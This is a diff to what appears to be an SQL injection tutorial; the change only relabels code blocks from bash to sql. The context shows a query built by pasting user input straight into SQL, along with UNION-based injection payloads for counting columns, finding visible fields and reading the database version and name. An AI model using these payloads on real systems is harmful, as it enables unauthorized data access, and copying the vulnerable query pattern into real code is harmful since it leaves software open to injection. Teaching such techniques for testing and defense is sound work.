@@ -30,13 +30,13 @@ b) Example:
 
 Consider the following vulnerable SQL query:
 
-```bash
+```sql
 SELECT * FROM users WHERE username = '$username' AND password = '$password';
 ```
 
 An attacker can inject a payload like:
 
-```bash
+```sql
 ' UNION SELECT 1, 2, 3 -- -
 ```
 
@@ -57,7 +57,7 @@ This will append a new SELECT statement, returning three columns with values 1, 
     
     Example:
     
-    ```bash
+    ```sql
     ' ORDER BY 1-- -
     ' ORDER BY 2-- -
     ' ORDER BY 3-- -
@@ -81,7 +81,7 @@ This will append a new SELECT statement, returning three columns with values 1, 
     
     Example:
     
-    ```bash
+    ```sql
     ' UNION SELECT NULL-- -
     ' UNION SELECT NULL, NULL-- -
     ' UNION SELECT NULL, NULL, NULL-- -
@@ -111,7 +111,7 @@ b) Steps:
 
 c) Example: Inject the following payload:
 
-```bash
+```sql
 ' UNION SELECT 1, 2, 3, 4-- -
 ```
 
@@ -125,7 +125,7 @@ a) Database Version:
     
 * Example:
     
-    ```bash
+    ```sql
     ' UNION SELECT NULL, @@version, NULL, NULL-- -
     ```
     
@@ -136,7 +136,7 @@ b) Database Name:
     
 * Example:
     
-    ```bash
+    ```sql
     ' UNION SELECT NULL, database(), NULL, NULL-- -
     ```
     
